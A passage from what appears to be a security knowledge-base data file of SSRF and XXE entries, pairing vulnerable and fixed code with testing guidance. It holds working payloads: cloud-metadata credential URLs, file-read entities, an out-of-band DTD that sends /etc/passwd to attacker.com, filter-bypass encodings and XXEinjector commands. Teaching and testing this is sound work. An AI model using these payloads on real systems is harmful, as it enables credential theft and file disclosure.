      "SSRF occurs when an application accepts a user-supplied URL, hostname, or IP address " +
      "and makes a server-side HTTP (or other protocol) request to it, without validating " +
      "that the destination is an intended, safe external resource. Because the request " +
      "originates from the server itself, it inherits the server's network position -- it " +
      "can reach internal-only services (databases, internal APIs, admin panels) that are " +
      "not exposed to the internet, and cloud metadata endpoints (169.254.169.254) that " +
      "expose instance credentials.\n\n" +
      "Common vulnerable features include URL preview/unfurling ('paste a link to see a " +
      "preview'), webhook configuration, image/file fetching from a remote URL, PDF " +
      "generation from a URL, and 'import from URL' functionality. Basic/direct SSRF is the " +
      "variant where the attacker sees the response of the server-side request directly in " +
      "the application's output (e.g. the fetched page's content is displayed), making it " +
      "straightforward to confirm and exploit for data exfiltration.",
    impact:
      "Access to internal-only network services and admin interfaces not reachable directly " +
      "from the internet; theft of cloud instance credentials via the metadata service " +
      "(169.254.169.254 on AWS/GCP/Azure), often leading to full cloud account compromise; " +
      "port scanning of internal networks via response-timing differences; reading local " +
      "files via file:// scheme support in some HTTP client libraries.",
    examples: [
      {
        title: "Python Flask URL preview feature fetching any user-supplied URL",
        vulnerable_code:
          "import requests\n" +
          "from flask import Flask, request, jsonify\n" +
          "app = Flask(__name__)\n\n" +
          "@app.route('/preview')\n" +
          "def preview():\n" +
          "    url = request.args.get('url')\n" +
          "    resp = requests.get(url, timeout=5)\n" +
          "    return jsonify({'content': resp.text[:500]})",
        fixed_code:
          "import ipaddress\n" +
          "import socket\n" +
          "from urllib.parse import urlparse\n" +
          "import requests\n" +
          "from flask import Flask, request, jsonify, abort\n" +
          "app = Flask(__name__)\n\n" +
          "ALLOWED_SCHEMES = {'http', 'https'}\n\n" +
          "def is_public_address(hostname):\n" +
          "    try:\n" +
          "        infos = socket.getaddrinfo(hostname, None)\n" +
          "    except socket.gaierror:\n" +
          "        return False\n" +
          "    for info in infos:\n" +
          "        ip = ipaddress.ip_address(info[4][0])\n" +
          "        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:\n" +
          "            return False\n" +
          "    return True\n\n" +
          "@app.route('/preview')\n" +
          "def preview():\n" +
          "    url = request.args.get('url', '')\n" +
          "    parsed = urlparse(url)\n" +
          "    if parsed.scheme not in ALLOWED_SCHEMES or not parsed.hostname:\n" +
          "        abort(400)\n" +
          "    if not is_public_address(parsed.hostname):\n" +
          "        abort(400, 'destination not allowed')\n" +
          "    resp = requests.get(\n" +
          "        url, timeout=5, allow_redirects=False,\n" +
          "        headers={'User-Agent': 'PreviewBot/1.0'}\n" +
          "    )\n" +
          "    return jsonify({'content': resp.text[:500]})",
        explanation:
          "Requesting /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ " +
          "makes the server fetch AWS instance metadata and return temporary IAM credentials " +
          "directly in the response, or /preview?url=http://internal-admin.corp.local:8080/ " +
          "reaches an internal admin panel unreachable from the public internet. The fixed " +
          "version resolves the hostname and explicitly rejects private, loopback, " +
          "link-local, and reserved IP ranges (which blocks 169.254.169.254 and RFC1918 " +
          "space) before making the request, and disables automatic redirect following so a " +
          "public URL cannot redirect to an internal address after the check has passed."
      }
    ],
    detection_methods: [
      "Submit URLs pointing to the cloud metadata address (169.254.169.254) and internal RFC1918 ranges (127.0.0.1, 10.x, 172.16-31.x, 192.168.x) and observe whether the response reflects internal content",
      "Use an out-of-band collector domain as the target URL to confirm the server actually issues an outbound request even when the response is not directly reflected",
      "Test alternate IP representations (decimal, octal, hex-encoded IPs like http://2130706433/ for 127.0.0.1) to bypass naive string-based blocklist filters",
      "Test alternate URL schemes (file://, gopher://, dict://) if the underlying HTTP client library supports them"
    ],
    tools: ["Burp Suite Collaborator", "Interactsh", "SSRFmap", "gopherus (for gopher:// protocol smuggling payload generation)"],
    automated_testing:
      "Burp Suite Collaborator (or self-hosted Interactsh) provides unique per-test callback " +
      "domains; substitute every URL-accepting parameter with a Collaborator payload URL and " +
      "monitor for DNS/HTTP interactions, which confirm SSRF even when the response gives no " +
      "direct feedback. SSRFmap automates exploitation once a vulnerable parameter is " +
      "identified, including cloud metadata extraction and internal port scanning modules.",
    manual_testing: [
      "Identify every feature that fetches a remote resource based on user-supplied input: link previews, webhooks, avatar-from-URL, PDF/document generation, import features",
      "Test direct access to cloud metadata: http://169.254.169.254/latest/meta-data/ (AWS), http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata: true header (Azure), http://metadata.google.internal/computeMetadata/v1/ with Metadata-Flavor: Google header (GCP)",
      "Test internal network access: http://127.0.0.1/, http://localhost/, and RFC1918 ranges, plus internal hostnames guessed from context (internal-api, admin.internal)",
      "Test IP obfuscation techniques to bypass blocklists: decimal (2130706433), octal (0177.0.0.1), hex (0x7f000001), IPv6 (::1, ::ffff:127.0.0.1), and short-form (127.1)",
      "Test whether redirects are followed: host a redirect from an allowed public URL to an internal address and see if the SSRF filter is only applied to the initial URL",
      "If confirmed, attempt to enumerate internal services via response timing/content differences (basic internal port scanning) and extract cloud credentials if metadata access succeeds"
    ],
    remediation:
      "Validate destination URLs against an allowlist of expected schemes and, ideally, " +
      "specific expected hostnames/domains rather than attempting to blocklist dangerous " +
      "targets (which is reliably bypassable via encoding tricks and redirects). Resolve the " +
      "hostname and validate the resulting IP address is not private/loopback/link-local " +
      "immediately before connecting, and re-validate after any redirect (or disable redirect " +
      "following entirely). Where feasible, route all outbound server-initiated requests " +
      "through an egress proxy that enforces network-level allowlisting independent of " +
      "application logic, and disable unnecessary URL schemes in the HTTP client library. " +
      "Use IMDSv2 (session-token-required metadata access) on AWS to reduce the impact of " +
      "any residual metadata-endpoint SSRF, and apply the principle of least privilege to " +
      "instance IAM roles.",
    references: [
      "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
      "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
      "https://portswigger.net/web-security/ssrf"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "ssrf-blind",
    name: "Server-Side Request Forgery (Blind / Out-of-Band)",
    category: "Access Control",
    cwe: "CWE-918",
    owasp_category: "A10:2021 - Server-Side Request Forgery",
    description:
      "Blind SSRF occurs when the application makes the attacker-influenced server-side " +
      "request but never returns any part of the response (or even a timing/error signal) " +
      "back to the attacker. Common sources include webhook URL fields, 'notify this URL on " +
      "completion' settings, avatar/logo fetch-and-cache features, and asynchronous document " +
      "processing pipelines. Detection and exploitation both rely on out-of-band techniques: " +
      "the attacker supplies a URL pointing at infrastructure they control (a unique " +
      "subdomain wired to Burp Collaborator or Interactsh) and watches for an incoming DNS " +
      "lookup or HTTP request, which proves the server made the request even though nothing " +
      "is reflected.\n\n" +
      "While blind SSRF cannot directly exfiltrate response content back through the " +
      "application's own output, it is still highly exploitable: it can be used to reach " +
      "internal services that perform an action as a side effect of being requested (trigger " +
      "an internal deploy webhook, hit an unauthenticated internal admin action endpoint via " +
      "GET), or chained with DNS rebinding to defeat allowlist checks performed before the " +
      "actual request is issued (time-of-check/time-of-use gap between validation and " +
      "connection).",
    impact:
      "Confirmation and internal network reconnaissance even without direct response " +
      "reflection; ability to trigger side-effecting internal actions blind (internal " +
      "webhooks, unauthenticated internal state-changing GET endpoints); combined with DNS " +
      "rebinding, can defeat allowlist-based SSRF protections entirely.",
    examples: [
      {
        title: "Webhook notification feature with no response ever surfaced to the user",
        vulnerable_code:
          "app.post('/webhooks/configure', requireAuth, async (req, res) => {\n" +
          "  await db.webhooks.upsert({\n" +
          "    userId: req.session.userId,\n" +
          "    url: req.body.callbackUrl\n" +
          "  });\n" +
          "  res.send('Webhook saved');\n" +
          "});\n\n" +
          "// Later, on some internal event:\n" +
          "async function fireWebhook(userId, payload) {\n" +
          "  const hook = await db.webhooks.findByUser(userId);\n" +
          "  await axios.post(hook.url, payload, { timeout: 5000 }); // response discarded\n" +
          "}",
        fixed_code:
          "const dns = require('dns').promises;\n" +
          "const net = require('net');\n\n" +
          "async function validateWebhookUrl(rawUrl) {\n" +
          "  const parsed = new URL(rawUrl);\n" +
          "  if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error('bad scheme');\n" +
          "  const { address } = await dns.lookup(parsed.hostname);\n" +
          "  if (\n" +
          "    net.isIP(address) &&\n" +
          "    (address.startsWith('127.') || address.startsWith('10.') ||\n" +
          "     address.startsWith('192.168.') || address.startsWith('169.254.') ||\n" +
          "     /^172\\.(1[6-9]|2\\d|3[0-1])\\./.test(address))\n" +
          "  ) {\n" +
          "    throw new Error('destination not allowed');\n" +
          "  }\n" +
          "  return parsed.toString();\n" +
          "}\n\n" +
          "app.post('/webhooks/configure', requireAuth, async (req, res) => {\n" +
          "  try {\n" +
          "    const url = await validateWebhookUrl(req.body.callbackUrl);\n" +
          "    await db.webhooks.upsert({ userId: req.session.userId, url });\n" +
          "    res.send('Webhook saved');\n" +
          "  } catch (e) {\n" +
          "    res.status(400).send('Invalid webhook URL');\n" +
          "  }\n" +
          "});\n" +
          "// Also re-validate the resolved IP immediately before firing the webhook,\n" +
          "// not just at configuration time, to close the DNS-rebinding TOCTOU gap.",
        explanation:
          "An attacker configures their webhook callbackUrl as " +
          "http://internal-deploy-service.corp.local:9000/trigger-deploy?branch=malicious. " +
          "Nothing about the webhook response is ever shown to the attacker, but the " +
          "internal deploy trigger fires regardless, purely as a side effect of the " +
          "server-side POST being made -- classic blind SSRF impact with no data exfiltration " +
          "needed. The fix validates the resolved IP against private ranges both at " +
          "configuration time and (critically) again immediately before actually firing the " +
          "webhook, to prevent a DNS-rebinding attacker from pointing the hostname at a " +
          "public IP during validation and an internal IP at delivery time."
      }
    ],
    detection_methods: [
      "Supply out-of-band collector URLs (Burp Collaborator, Interactsh) in every URL-accepting field, even ones with no visible response, and monitor for DNS/HTTP callbacks",
      "Vary the response delay of the collector to test whether timing differences leak information even in fully blind scenarios",
      "Test DNS-rebinding scenarios by pointing a domain you control first at a public IP (to pass validation) then rebinding it to an internal IP with a very low TTL"
    ],
    tools: ["Burp Suite Collaborator", "Interactsh", "SSRFmap", "custom DNS-rebinding test infrastructure (e.g. singularity of origin, rbndr.us style rebinding services)"],
    automated_testing:
      "Systematically replace every URL-accepting parameter across the entire application " +
      "(including ones that appear to have no reflected output) with a unique Collaborator " +
      "payload per field, then review the Collaborator interaction log at the end of the " +
      "engagement for any DNS/HTTP hits, which map back to confirmed blind SSRF sinks even " +
      "in features tested days earlier.",
    manual_testing: [
      "Enumerate all URL/webhook/callback-accepting fields across the entire application, not just obviously response-reflecting ones",
      "Submit a unique out-of-band collector URL per field and monitor for callbacks over an extended window, since some triggers (scheduled jobs, async processing) fire later",
      "For any confirmed blind SSRF, attempt to reach known internal service ports/paths blind (internal admin trigger endpoints, cloud metadata) and infer success via secondary side effects",
      "Test DNS-rebinding to see if allowlist validation is performed once at input time versus re-validated immediately before the connection is made"
    ],
    remediation:
      "Apply the same allowlist-based validation as basic SSRF, but critically perform that " +
      "validation immediately before every outbound connection is made (not just once at " +
      "configuration/input time) to close DNS-rebinding TOCTOU gaps. Route webhook and other " +
      "server-initiated requests through a dedicated egress proxy/network segment with " +
      "firewall-level restrictions to internal address space, independent of application-layer " +
      "checks. Use Collaborator-style out-of-band monitoring internally as part of your own " +
      "security testing program to catch blind SSRF before attackers do.",
    references: [
      "https://portswigger.net/web-security/ssrf/blind",
      "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
    ],
    difficulty: "Hard",
    commonness: "Common"
  },

  {
    id: "ssrf-url-parser",
    name: "Server-Side Request Forgery (URL Parser Inconsistencies)",
    category: "Access Control",
    cwe: "CWE-918",
    owasp_category: "A10:2021 - Server-Side Request Forgery",
    description:
      "This SSRF variant bypasses allowlist/blocklist validation logic by exploiting " +
      "discrepancies between how the validating code parses a URL and how the HTTP client " +
      "library that actually issues the request parses the same URL string. URL parsing has " +
      "many documented ambiguities: userinfo components before an @ (http://allowed.com@evil.com/), " +
      "backslash-as-slash normalization quirks, unicode/IDN homograph confusion, malformed " +
      "scheme handling, and differing behavior around fragments, whitespace, and multiple @ " +
      "or # characters across different parser implementations (browser URL parser vs " +
      "Python's urllib vs Java's java.net.URL vs Go's net/url vs a regex-based validator).\n\n" +
      "A validator that checks 'does the hostname equal an allowed value' using a naive " +
      "regex or substring check (e.g. does the URL contain 'allowed-domain.com') is " +
      "especially exploitable, since http://evil.com/allowed-domain.com or " +
      "http://allowed-domain.com.evil.com both contain the substring but resolve to " +
      "attacker-controlled infrastructure. This class of bug was central to several major " +
      "disclosed SSRF vulnerabilities in cloud provider consoles and SaaS webhook features.",
    impact:
      "Complete bypass of SSRF allowlist/blocklist defenses, restoring full basic/blind SSRF " +
      "impact (internal network access, cloud metadata theft) even against applications that " +
      "believed they had implemented adequate URL validation.",
    examples: [
      {
        title: "Go application validating hostname via string parsing before making the request with a different parser",
        vulnerable_code:
          "func isAllowedHost(rawURL string) bool {\n" +
          "    // naive substring check performed on the raw string\n" +
          "    return strings.Contains(rawURL, \"api.partner.com\")\n" +
          "}\n\n" +
          "func fetchPartnerData(rawURL string) (*http.Response, error) {\n" +
          "    if !isAllowedHost(rawURL) {\n" +
          "        return nil, errors.New(\"host not allowed\")\n" +
          "    }\n" +
          "    return http.Get(rawURL)\n" +
          "}",
        fixed_code:
          "func isAllowedHost(rawURL string) bool {\n" +
          "    parsed, err := url.Parse(rawURL)\n" +
          "    if err != nil || (parsed.Scheme != \"http\" && parsed.Scheme != \"https\") {\n" +
          "        return false\n" +
          "    }\n" +
          "    // Exact hostname match, not substring/contains -- and no userinfo allowed\n" +
          "    if parsed.User != nil {\n" +
          "        return false\n" +
          "    }\n" +
          "    return parsed.Hostname() == \"api.partner.com\"\n" +
          "}\n\n" +
          "func fetchPartnerData(rawURL string) (*http.Response, error) {\n" +
          "    if !isAllowedHost(rawURL) {\n" +
          "        return nil, errors.New(\"host not allowed\")\n" +
          "    }\n" +
          "    client := &http.Client{\n" +
          "        CheckRedirect: func(req *http.Request, via []*http.Request) error {\n" +
          "            return http.ErrUseLastResponse // do not silently follow redirects\n" +
          "        },\n" +
          "    }\n" +
          "    return client.Get(rawURL)\n" +
          "}",
        explanation:
          "The vulnerable check merely tests whether the string \"api.partner.com\" appears " +
          "anywhere in the URL, so an attacker submits " +
          "http://attacker.com/api.partner.com or http://api.partner.com.attacker.com/ -- " +
          "both contain the substring and pass validation, but both resolve to " +
          "attacker-controlled infrastructure when http.Get() actually issues the request " +
          "using Go's real URL/DNS resolution. The fix properly parses the URL into its " +
          "components and compares the exact Hostname() field (not a substring match) " +
          "against the allowed value, and additionally rejects any userinfo component, " +
          "which closes the http://allowed@evil.com style bypass as well."
      }
    ],
    detection_methods: [
      "Test userinfo-based bypasses: http://allowed-host@evil.com/, http://evil.com#@allowed-host/",
      "Test subdomain/suffix confusion: http://evil.com/allowed-host, http://allowed-host.evil.com/",
      "Test alternate encodings and malformed schemes that some parsers normalize differently than others (backslashes instead of forward slashes, missing scheme, excessive whitespace/control characters)",
      "Compare how the specific frameworks/libraries in use (identified via fingerprinting or source review) parse edge-case URLs versus how the application's validation logic parses them"
    ],
    tools: ["Burp Suite Collaborator (to confirm the actual resolved destination)", "SSRFmap", "manual differential testing against the specific parser libraries in use"],
    automated_testing:
      "There is no fully generic automated tool for parser-differential SSRF since the " +
      "specific bypass depends on the exact validator and HTTP client library pairing in " +
      "use; the practical approach is to fingerprint the tech stack, consult known parser " +
      "quirks for that language/library combination, and confirm candidate bypass payloads " +
      "against a Collaborator/Interactsh listener to verify the actual outbound destination.",
    manual_testing: [
      "Identify the exact language, HTTP client library, and any custom validation logic protecting URL-accepting parameters",
      "Systematically test known URL parser differential payloads: userinfo tricks (user@host), backslash normalization, IDN homographs, malformed scheme prefixes",
      "Confirm actual outbound destination with an out-of-band collector rather than trusting the validator's apparent behavior, since the validator and the requester may resolve the URL differently",
      "Test whether the validation is applied to the original input string or is re-derived after any internal URL normalization/canonicalization step, which is a common source of bypass"
    ],
    remediation:
      "Use a single, well-tested URL parsing library consistently for both validation and " +
      "the actual outbound request (never validate with one parser/regex and connect with " +
      "another). Perform exact hostname comparison against an allowlist (never substring or " +
      "'contains' checks), reject any URL containing userinfo components, and resolve the " +
      "hostname to an IP address for validation immediately before connecting rather than " +
      "trusting string-level hostname checks alone.",
    references: [
      "https://portswigger.net/web-security/ssrf",
      "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
    ],
    difficulty: "Hard",
    commonness: "Uncommon"
  },

  // ===========================================================================
  // XML EXTERNAL ENTITY (XXE)
  // ===========================================================================

  {
    id: "xxe-basic",
    name: "XML External Entity Injection (Basic / In-Band)",
    category: "Injection",
    cwe: "CWE-611",
    owasp_category: "A05:2021 - Security Misconfiguration",
    description:
      "XXE exploits XML parsers configured to resolve external entities declared in a " +
      "document's DOCTYPE -- a legacy XML feature that lets a document reference external " +
      "content (a local file, an HTTP URL) via an <!ENTITY> declaration. If an application " +
      "parses attacker-supplied XML with external entity resolution enabled (the historical " +
      "default in many XML parsers including older libxml2, Java's default DocumentBuilderFactory, " +
      "and .NET's XmlDocument prior to .NET Framework 4.5.2), an attacker can declare an " +
      "entity pointing at a local file (file:///etc/passwd) and reference it within the " +
      "document body, causing the parser to substitute the file's contents directly into the " +
      "parsed output.\n\n" +
      "In-band (basic) XXE means the file contents are directly reflected back in the " +
      "application's response, making exploitation immediate and simple to confirm. Any " +
      "feature accepting XML input is a candidate: SOAP APIs, file uploads (DOCX/XLSX/ODT " +
      "and SVG are ZIP/XML-based formats), RSS/Atom feed parsers, SAML authentication " +
      "responses, and configuration import features.",
    impact:
      "Arbitrary local file disclosure (source code, configuration files, SSH keys, " +
      "/etc/passwd); when combined with PHP's expect:// or similar wrappers, potential " +
      "remote code execution; denial of service via the 'billion laughs' recursive entity " +
      "expansion attack; internal port scanning and SSRF via entities that reference " +
      "internal URLs.",
    examples: [
      {
        title: "Java SOAP endpoint parsing XML with default (unsafe) DocumentBuilderFactory",
        vulnerable_code:
          "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n" +
          "DocumentBuilder builder = dbf.newDocumentBuilder();\n" +
          "Document doc = builder.parse(new InputSource(request.getInputStream()));\n" +
          "String username = doc.getElementsByTagName(\"username\").item(0).getTextContent();",
        fixed_code:
          "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n" +
          "dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n" +
          "dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n" +
          "dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n" +
          "dbf.setXIncludeAware(false);\n" +
          "dbf.setExpandEntityReferences(false);\n" +
          "DocumentBuilder builder = dbf.newDocumentBuilder();\n" +
          "Document doc = builder.parse(new InputSource(request.getInputStream()));\n" +
          "String username = doc.getElementsByTagName(\"username\").item(0).getTextContent();",
        explanation:
          "Submitting a body of <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM " +
          "\"file:///etc/passwd\">]><user><username>&xxe;</username></user> makes the " +
          "unhardened parser substitute /etc/passwd's contents into the username field, " +
          "which the application then reflects back in its response or error message. The " +
          "fix disables DOCTYPE declarations entirely (the single most effective mitigation, " +
          "since nearly no legitimate business XML requires custom entities) and, as " +
          "additional defense-in-depth, disables external general/parameter entity " +
          "resolution and XInclude processing."
      }
    ],
    detection_methods: [
      "Submit an XML payload declaring an external entity pointing at a known local file (file:///etc/passwd on Linux, file:///C:/Windows/win.ini on Windows) and check if its contents appear in the response",
      "Test any file upload accepting XML-based formats (SVG, DOCX, XLSX, ODT, XML config imports) with an embedded malicious DOCTYPE",
      "Review server-side XML parser configuration/library defaults for the specific language and library in use, since safe defaults vary widely by parser and version"
    ],
    tools: ["Burp Suite", "XXEinjector", "manual crafted XML payloads"],
    automated_testing:
      "Burp Suite's active scanner detects classic in-band XXE reliably by injecting " +
      "canary-file-read entities and checking for reflection; XXEinjector automates a " +
      "broader range of techniques including blind/OOB and can brute-force local file paths " +
      "once a working injection point is confirmed: `ruby XXEinjector.rb --host=target " +
      "--path=/api/upload --file=req.txt --https`.",
    manual_testing: [
      "Identify every endpoint accepting raw XML or XML-based file formats",
      "Submit a basic entity-based file-read payload targeting a well-known file and check for its content in the response",
      "If the endpoint expects a specific XML schema/root element, adapt the payload to match while keeping the DOCTYPE declaration and entity reference intact",
      "Test XML-based document formats (SVG image upload, DOCX/XLSX via their embedded XML parts) which are often overlooked as 'XML injection points' since the feature appears to be a plain file upload",
      "If direct file read fails, escalate to blind/OOB techniques (see xxe-blind-oob) before concluding the parser is hardened"
    ],
    remediation:
      "Disable DOCTYPE declarations entirely in the XML parser configuration wherever " +
      "possible (this is the single most robust fix, since legitimate use of custom DTDs in " +
      "typical web application XML processing is exceedingly rare). Where DOCTYPEs must be " +
      "permitted, explicitly disable external general and parameter entity resolution and " +
      "XInclude processing. Prefer data formats that do not carry this legacy risk (JSON) " +
      "where XML is not a hard requirement. Keep XML parsing libraries updated, since safe " +
      "defaults have improved over time (e.g. modern lxml/libxml2 versions disable network " +
      "entity resolution by default) but should never be assumed without explicit " +
      "configuration and testing.",
    references: [
      "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
      "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
      "https://cwe.mitre.org/data/definitions/611.html"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "xxe-blind-oob",
    name: "XML External Entity Injection (Blind / Out-of-Band)",
    category: "Injection",
    cwe: "CWE-611",
    owasp_category: "A05:2021 - Security Misconfiguration",
    description:
      "Blind XXE occurs when external entity resolution is possible but the parsed content " +
      "is never reflected back to the attacker directly. Exploitation instead relies on " +
      "out-of-band (OOB) exfiltration: the attacker hosts a malicious external DTD on a " +
      "server they control, references it via a parameter entity in the injected XML, and " +
      "that external DTD defines a second parameter entity that reads a local file and sends " +
      "its contents as part of an HTTP request (or DNS lookup) back to the attacker's " +
      "server -- a technique that works around XML's restriction preventing a general entity " +
      "from directly referencing a file inside another entity's replacement text, by using " +
      "parameter entities instead.\n\n" +
      "Even fully blind XXE (where the attacker cannot observe the exfiltrated file content " +
      "directly, only that a callback occurred) is still highly damaging via error-based " +
      "extraction techniques -- deliberately causing the external DTD to reference a " +
      "nonexistent file path, forcing the parser to raise an XML parsing error that includes " +
      "the file's actual first-line content in the error message, which many applications " +
      "return verbatim in a 500 error page.",
    impact:
      "Same file-disclosure and SSRF impact as basic XXE, but exploitable even when the " +
      "application never directly reflects parsed content; error-based variants can still " +
      "achieve full file content exfiltration one error message at a time.",
    examples: [
      {
        title: ".NET Core application processing XML with no reflected output, exploited via OOB DTD",
        vulnerable_code:
          "var settings = new XmlReaderSettings {\n" +
          "    DtdProcessing = DtdProcessing.Parse, // vulnerable: DTDs fully processed\n" +
          "    XmlResolver = new XmlUrlResolver() // vulnerable: allows external resource resolution\n" +
          "};\n" +
          "using var reader = XmlReader.Create(requestStream, settings);\n" +
          "var doc = new XmlDocument();\n" +
          "doc.Load(reader);\n" +
          "ProcessOrder(doc); // result never echoes any parsed field content back to the client",
        fixed_code:
          "var settings = new XmlReaderSettings {\n" +
          "    DtdProcessing = DtdProcessing.Prohibit, // reject any DOCTYPE outright\n" +
          "    XmlResolver = null // disable external entity/URL resolution entirely\n" +
          "};\n" +
          "using var reader = XmlReader.Create(requestStream, settings);\n" +
          "var doc = new XmlDocument();\n" +
          "doc.Load(reader);\n" +
          "ProcessOrder(doc);",
        explanation:
          "Even though the order-processing response never reflects any submitted field, an " +
          "attacker hosts evil.dtd on their server containing " +
          "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; " +
          "exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfil; and submits an order " +
          "XML referencing it via <!DOCTYPE order SYSTEM \"http://attacker.com/evil.dtd\">, " +
          "causing the .NET server to fetch the external DTD, read /etc/passwd locally, and " +
          "make an outbound HTTP request containing its contents to the attacker's server " +
          "log -- fully out-of-band, with nothing visible in the application's own response. " +
          "The fixed configuration sets DtdProcessing.Prohibit (rejecting the DOCTYPE outright) " +
          "and nulls the XmlResolver so no external URL, whether a DTD or an entity target, " +
          "can ever be fetched."
      }
    ],
    detection_methods: [
      "Inject an OOB parameter-entity payload referencing an attacker-controlled Collaborator/Interactsh domain and monitor for the callback",
      "Use error-based extraction by referencing a nonexistent local file path via the external DTD technique and checking if error messages leak file content",
      "Confirm even a bare DNS-only callback (no HTTP) to rule out egress filtering that might block outbound HTTP but not DNS"
    ],
    tools: ["Burp Suite Collaborator", "XXEinjector (--oob flag)", "Interactsh", "self-hosted DTD file server for manual testing"],
    automated_testing:
      "XXEinjector automates OOB XXE end-to-end: it hosts the malicious external DTD, wires " +
      "up a listener, injects the reference into the target request, and attempts to " +
      "brute-force readable file paths using the OOB error/exfiltration channel: " +
      "`ruby XXEinjector.rb --host=attacker-ip --file=req.txt --path=/orders --oob=http`.",
    manual_testing: [
      "Set up an out-of-band listener (Burp Collaborator client or self-hosted Interactsh) and a small HTTP server to host a malicious external DTD file",
      "Submit XML containing a DOCTYPE that references the external DTD via SYSTEM, and confirm the target fetches it (a hit on your file server confirms external entity resolution is enabled)",
      "If the external DTD fetch succeeds, upgrade the DTD to define the parameter-entity file-read-and-exfiltrate chain, targeting a known-readable file first (e.g. /etc/hostname) to validate the full chain before attempting sensitive files",
      "If OOB HTTP is blocked by egress filtering, fall back to error-based extraction (reference a deliberately invalid path suffix inside the entity to trigger a parser error containing partial file content)"
    ],
    remediation:
      "Identical to basic XXE: disable DOCTYPE processing entirely, or at minimum disable " +
      "external entity and external DTD resolution (set XmlResolver to null in .NET, " +
      "disable network access in libxml2/lxml, use Java's disallow-doctype-decl feature). " +
      "Additionally restrict outbound network egress from the application server at the " +
      "network layer so that even a residual XXE cannot reach attacker-controlled OOB " +
      "infrastructure or internal services.",
    references: [
      "https://portswigger.net/web-security/xxe/blind",
      "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
    ],
    difficulty: "Hard",
    commonness: "Uncommon"
  },

  {
    id: "xxe-file-upload",
    name: "XML External Entity Injection via File Upload (DOCX/XLSX/SVG)",
    category: "Injection",
    cwe: "CWE-611",
    owasp_category: "A05:2021 - Security Misconfiguration",
    description:
      "Many file formats that appear binary are actually XML (or ZIP archives of XML parts) " +
      "under the hood: Office Open XML documents (.docx, .xlsx, .pptx), OpenDocument files " +
      "(.odt, .ods), SVG images, and GPX/KML geo files. Applications that accept these " +
      "uploads and process them server-side (thumbnail generation, text extraction, virus " +
      "scanning that parses document structure, image rendering libraries that parse SVG as " +
      "XML) frequently pass the embedded XML straight to a parser without the hardening " +
      "applied to the application's 'obvious' API-facing XML endpoints, since developers " +
      "often do not think of a file upload feature as an XML injection surface at all.\n\n" +
      "This is one of the most commonly missed XXE vectors in real-world assessments because " +
      "security review frequently focuses on explicit XML/SOAP API endpoints and overlooks " +
      "'binary' file upload features that internally unzip and parse XML content, including " +
      "third-party libraries (image processors, document converters, PDF-from-Office " +
      "converters) bundled into the application that have their own, sometimes unhardened, " +
      "XML parsing defaults.",
    impact:
      "Identical XXE impact (file disclosure, SSRF, DoS) as basic/blind XXE, discovered " +
      "through a feature that is easy to overlook during security review because it is not " +
      "presented to the developer or reviewer as an 'XML feature'; often affects third-party " +
      "document-processing libraries embedded deep in the application stack.",
    examples: [
      {
        title: "SVG avatar upload processed by an image library that parses SVG as XML",
        vulnerable_code:
          "# Python: naive SVG handling before rasterizing to PNG\n" +
          "from lxml import etree\n\n" +
          "def process_avatar(svg_bytes):\n" +
          "    parser = etree.XMLParser() # resolve_entities defaults to True in older lxml\n" +
          "    tree = etree.fromstring(svg_bytes, parser)\n" +
          "    return rasterize_svg_tree(tree)",
        fixed_code:
          "from lxml import etree\n\n" +
          "def process_avatar(svg_bytes):\n" +
          "    parser = etree.XMLParser(\n" +
          "        resolve_entities=False,\n" +
          "        no_network=True,\n" +
          "        dtd_validation=False,\n" +
          "        load_dtd=False\n" +
          "    )\n" +
          "    tree = etree.fromstring(svg_bytes, parser)\n" +
          "    # Reject the file outright if a DOCTYPE is present at all -- legitimate\n" +
          "    # SVG uploads from design tools essentially never include one.\n" +
          "    if tree.getroottree().docinfo.doctype:\n" +
          "        raise ValueError('DOCTYPE not permitted in uploaded SVG')\n" +
          "    return rasterize_svg_tree(tree)",
        explanation:
          "An attacker uploads a 'profile picture' that is actually a crafted SVG file " +
          "containing <?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM " +
          "\"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;" +
          "</text></svg>; because lxml's default parser historically resolved entities, the " +
          "avatar-processing pipeline reads the local file during rasterization, potentially " +
          "leaking it into rendered image text, error logs, or an exception message returned " +
          "to the client. The fix explicitly disables entity resolution, network access, and " +
          "DTD loading on the parser, and additionally rejects any uploaded SVG containing a " +
          "DOCTYPE declaration outright, since legitimate design-tool SVG exports do not " +
          "include one."
      }
    ],
    detection_methods: [
      "Test every file-upload feature that accepts XML-based formats (SVG, DOCX, XLSX, PPTX, ODT, GPX, KML) with a crafted malicious payload disguised as that format",
      "For ZIP-based Office formats, replace one of the internal XML parts (e.g. word/document.xml inside a .docx) with an XXE payload and re-zip before uploading",
      "Trace the upload processing pipeline for any third-party library (image processor, document converter, virus scanner) that internally parses XML, since these often have separate/older parser configurations than the main application"
    ],
